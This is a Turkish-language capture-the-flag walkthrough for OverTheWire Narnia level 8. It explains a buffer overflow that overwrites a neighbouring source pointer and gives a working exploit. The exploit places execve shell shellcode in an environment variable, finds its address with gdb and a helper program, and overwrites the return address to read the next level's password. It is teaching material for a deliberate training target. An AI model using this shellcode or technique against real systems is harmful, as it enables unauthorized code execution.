# 💥 OverTheWire Narnia — Level 8 → Level 9 (Final)
## Kendini Ezen Pointer: `blah` Bozulurken Return Adresini Ele Geçirmek

> Narnia'nın son ve en sinsi level'ı. İlk bakışta basit bir overflow gibi: girdiyi
> `bok[20]`'ye kopyalıyoruz ve taşırıyoruz. Ama bir tuzak var: kaynak pointer
> `blah`, `bok`'un hemen üstünde duruyor. Taşma return adresine varmadan **önce
> `blah`'ı eziyor** — ve döngü `blah` üzerinden okuduğu için, `blah`'ı bozduğun
> an kopyanın **kaynağı kayıyor.** Çözüm bu kaymayı kontrol etmekten geçiyor.

| | |
|---|---|
| **Bağlantı** | `ssh narnia8@narnia.labs.overthewire.org -p 2226` |
| **Kaynak** | `/narnia/narnia8.c` · binary: `/narnia/narnia8` |
| **Kavram** | Self-referential pointer overflow + env değişkeninde shellcode |
| **Zorluk** | ⭐⭐⭐⭐⭐ |

**Bu level için gereken konular:**
- [`08_pointer_manipulation.md`](../../konu_anlatimlari/binary_exploitation/08_pointer_manipulation.md) — pointer'ın kendisini ezmek (önce bunu oku!)
- [`04_shellcode_ve_nop_sled.md`](../../konu_anlatimlari/binary_exploitation/04_shellcode_ve_nop_sled.md) — env değişkeninde shellcode + adres bulma
- [`03_eip_register_kontrolu.md`](../../konu_anlatimlari/binary_exploitation/03_eip_register_kontrolu.md) — return adresini ezmek

---

## 🎯 Hedef

`func`, girdiyi `bok[20]`'ye byte byte kopyalıyor. Taşmayı kullanıp `func`'ın **return adresini**, bir ortam değişkenine koyduğumuz shellcode'un adresiyle değiştireceğiz. Ama önce, kopyanın kaynağı olan `blah` pointer'ını bozmadan (ya da bozarken kontrol ederek) return adresine ulaşmamız gerekiyor.

---

## 📖 Kaynak Kod

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// gcc's variable reordering fucked things up
// to keep the level in its old style i am
// making "i" global until i find a fix - morla
int i;

void func(char *b){
    char *blah=b;          // blah → girdimiz (argv[1])
    char bok[20];          // hedef buffer
    //int i=0;

    memset(bok, '\0', sizeof(bok));
    for(i=0; blah[i] != '\0'; i++)   // ← AÇIK: sınır kontrolü YOK
        bok[i]=blah[i];              // kaynak blah[i], hedef bok[i]

    printf("%s\n",bok);
}

int main(int argc, char **argv){
    if(argc > 1)
        func(argv[1]);
    else
        printf("%s argument\n", argv[0]);

    return 0;
}
```

---

## 🔍 Kaynak Kodu Analizi — Açık ve Twist

**Açık:** `for(i=0; blah[i] != '\0'; i++) bok[i]=blah[i];` — `bok` 20 byte ama döngü null görene kadar kopyalıyor. Yani 20'den uzun girdiyle `bok`'u taşırırız.

**Twist (bu level'ın kalbi):** `blah` bir **local pointer** ve stack'te `bok`'un hemen üstünde:

```
Düşük adres → [ bok[20] ][ blah (ptr) ][ saved EBP ][ return adresi ] → Yüksek adres
                          ^i=20'de buraya ulaşır     ^asıl hedefimiz
```

`bok`'u taşırınca **önce `blah` pointer'ına** ulaşırsın (return adresinden önce). Ama döngü `blah[i]`'den **okuyor**: `blah`'ın byte'larını ezdiğin an, kaynak adresi değişir ve sonraki `blah[i]` okumaları **bambaşka bir yerden** gelir. Naif bir overflow bu yüzden çöker:

```bash
narnia8@narnia:/narnia$ ./narnia8 $(python3 -c 'print("A"*20)')
AAAAAAAAAAAAAAAAAAAA...          # 20 byte sorun yok
narnia8@narnia:/narnia$ ./narnia8 $(python3 -c 'print("A"*21)')
Segmentation fault               # 21. byte blah'ı bozdu → kaynak kayboldu
```

**Çözüm fikri:** `blah`'ı, **kendi girdine (argv[1]) geri işaret edecek** bir adresle ezeceğiz. Böylece `blah` bozulsa bile döngü senin byte'larını okumaya devam eder — ve sonuna koyduğun **return adresi**'ni, saved EBP'nin üstündeki return slotuna kopyalar. `blah`'ın byte-byte ezilmesi küçük bir indeks kayması yaratır; bu yüzden yeni `blah` değeri ile dolgu uzunluğunu **gdb'de ayarlarsın** ta ki return adresi tam yerine otursun.

> ⚠️ Bu level kapalı-form bir formülle değil, **gdb'de deneme-yanılma** ile çözülür. Aşağıdaki tüm adresler **örnektir**; kendi makinende/oturumunda gdb ile bulman gerekir.

---

## 📚 Gereken Teori (özet)

- **Self-referential pointer:** Kaynak pointer hedef buffer'ın komşusundaysa, taşma onu ezer ve kopyanın kaynağını değiştirir → [`08`](../../konu_anlatimlari/binary_exploitation/08_pointer_manipulation.md).
- **Env'de shellcode:** Girdi return adresini ezmeye gidiyor, shellcode için yerimiz dar. Bu yüzden shellcode'u bir **ortam değişkenine** koyup adresini return adresine yazarız (narnia1/narnia4 ruhu) → [`04`](../../konu_anlatimlari/binary_exploitation/04_shellcode_ve_nop_sled.md).

---

## 🧪 Adım Adım

### Adım 1 — Shellcode'u temiz bir env'e koy

Repodaki standart 25-byte execve("/bin//sh") shellcode'u kullanıyoruz. Adres kararlı olsun diye `env -i` ile **temizlenmiş** bir ortam kuracağız (fazla değişken yok → adres oturumlar arası tutarlı):

```bash
SHELLCODE='\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80'
```

### Adım 2 — Shellcode'un adresini `getenvaddr` ile bul

Bir env değişkeninin adresi, çalışan programın **isminin uzunluğuna** bağlıdır. Küçük bir yardımcı bunu hesaba katar:

```c
// /tmp/getenvaddr.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
int main(int argc, char *argv[]){
    char *ptr = getenv(argv[1]);                          // env değişkeni adı
    ptr += (strlen(argv[0]) - strlen(argv[2])) * 2;       // program ismi farkını düzelt
    printf("%s -> %p\n", argv[1], ptr);
    return 0;
}
```

```bash
narnia8@narnia:/narnia$ gcc -m32 -o /tmp/getenvaddr /tmp/getenvaddr.c
# narnia8 ile AYNI temiz ortamda çalıştır ki adres eşleşsin:
narnia8@narnia:/narnia$ env -i EGG=$(python3 -c "import sys; sys.stdout.buffer.write(b'$SHELLCODE')") \
    /tmp/getenvaddr EGG /narnia/narnia8
EGG -> 0xffffdfce        # ← shellcode adresi (ÖRNEK — seninki farklı olacak)
```

### Adım 3 — gdb ile düzeni çöz: `blah` nerede, return adresi nerede?

```bash
narnia8@narnia:/narnia$ gdb -q ./narnia8
(gdb) disas func                 # kopya döngüsünden SONRAKİ adresi bul
(gdb) b *func+<...>              # döngü bittikten sonraya breakpoint
(gdb) run $(python3 -c 'print("A"*20 + "BBBB" + "C"*12 + "DDDD")')
(gdb) x/24wx $esp
# Burada gör:
#  - 'AAAA' bloğu (bok)
#  - 'BBBB' (0x42424242) → blah pointer'ının yeri (i=20)
#  - 'DDDD' (0x44444444) → return adresinin yeri  → SEGV 0x44444444 olur
```

`0x44444444`'te segfault alıyorsan, `DDDD`'nin return adresine düştüğünü doğruladın. `BBBB`'nin (blah) yeri ile return adresi arasındaki **byte sayısını** (örnekte 4 + 12) buradan ölçersin.

### Adım 4 — Yeni `blah` değerini ayarla

`blah`'ı, girdinin geri kalanını (saved EBP dolgusu + return adresi) doğru okutacak bir adresle ezersin — genelde **argv[1]'in başına** ya da gdb'de gözlemlediğin, indeksleri hizalayan bir adrese. Byte-byte ezilme küçük bir kayma yaratır; `blah` değerini birkaç byte oynatarak `D`'lerin tam return slotuna oturduğu değeri bulursun.

---

## ▶️ Çalıştırma

Yapı (tuonilabs'in çalışan formu — adresler örnek):

```bash
narnia8@narnia:/narnia$ env -i PWD="/narnia" SHLVL=0 \
  EGG=$(python3 -c "import sys; sys.stdout.buffer.write(b'$SHELLCODE')") \
  /narnia/narnia8 "$(python3 -c 'import sys; sys.stdout.buffer.write(
      b"A"*20 +                 # bok[20] dolgusu
      b"\x87\xdf\xff\xff" +     # yeni blah → girdiye geri işaret eder (ÖRNEK adres)
      b"B"*12 +                 # blah ile return arası dolgu (saved EBP + boşluk)
      b"\xce\xdf\xff\xff"       # return adresi = EGG (shellcode) adresi (ÖRNEK)
  )')"
$ cat /etc/narnia_pass/narnia9
<şifre buraya gelir>
```

`Segmentation fault` alıyorsan paniğe kapılma — bu level'da normal. gdb'de `x/wx $esp` ile return slotunda ne olduğuna bak, yeni `blah` adresini ve dolgu uzunluğunu ona göre 1–2 byte oynat. Doğru kombinasyonu bulunca shell açılır.

> 🎉 Bu şifreyi aldıysan **Narnia'yı tamamladın.** En zor format string ve pointer açıklarını geçtin.

---

## ⚠️ Yaygın Hatalar / Tuzaklar

**1. Naif overflow denemek.** `"A"*offset + retaddr` burada **çalışmaz**: 20. byte'tan sonra `blah` bozulur, kaynak kaybolur, segfault. `blah`'ı kontrollü bir adresle ezmek şart.

**2. Env adresinin kararsızlığı.** Env değişkeni adresi, ortamdaki diğer değişkenlere ve program ismine bağlı. **`env -i` ile temiz ortam** kullan ve `getenvaddr`'ı **aynı ortamda** çalıştır — yoksa adres tutmaz.

**3. `getenvaddr` ile farklı isim/ortam.** `getenvaddr`'a hedef program ismini (`/narnia/narnia8`) tam ver; kendi ismi (`argv[0]`) ile hedef ismi farkı düzeltmeye giriyor. Farklı path verirsen adres kayar.

**4. Adresleri sabit sanmak.** Buradaki tüm adresler (`0xffffdf87`, `0xffffdfce`, dolgu = 12) **örnektir**. Sunucu, ortam ve girdi uzunluğu değiştikçe kayar — gdb ile **kendi** değerlerini bul.

**5. `print()` ile byte göndermek.** `\x87\xdf...` bozulur → `sys.stdout.buffer.write(b"...")`.

**6. Sabır.** Bu level deneme-yanılma ister; gdb'de `x/wx $esp` ile her denemede return slotunu izleyip adresi/dolguyu ince ayar yap.

---

## ✅ Ne Öğrendik

- Bir kopya döngüsünde **kaynak pointer hedef buffer'ın komşusuysa**, taşma onu ezer ve kopyanın kaynağını ortasında değiştirir — bu hem bir tuzak hem de (kontrol edilirse) bir saldırı primitive'i.
- Çözüm: bozulan pointer'ı **kontrollü bir adresle** (genelde kendi girdine geri) ezip kopyanın doğru byte'ları okumaya devam etmesini sağlamak.
- Girdide yer dar olduğunda shellcode'u **ortam değişkenine** koyup adresini return adresine yazarız; adresi `getenvaddr` + `env -i` ile kararlı şekilde buluruz.
- Gerçek exploit geliştirme çoğu zaman **gdb'de iteratif** ilerler: dene, stack'e bak, adresi/dolguyu ayarla, tekrar dene.

**Narnia serisi tamamlandı! 🎉** Repodaki yola göre sıradaki wargame **Behemoth** (önce iki seri arası **CTF kapısı**: Robin için yerel bir zafiyetli binary'yi exploitleyip şifreyi gir).

---

## ⬅️➡️ Gezinme

- **Önceki:** [Level 7 → Level 8 — Format String → Fonksiyon Pointer](./narnia_7-8.md)
- **Sonraki:** Narnia bitti → CTF kapısı (Robin) → **Behemoth** wargame'i

---

*Bu rehber [waitaseC137/linux_learning](https://github.com/waitaseC137/linux_learning) reposunun bir parçasıdır.*
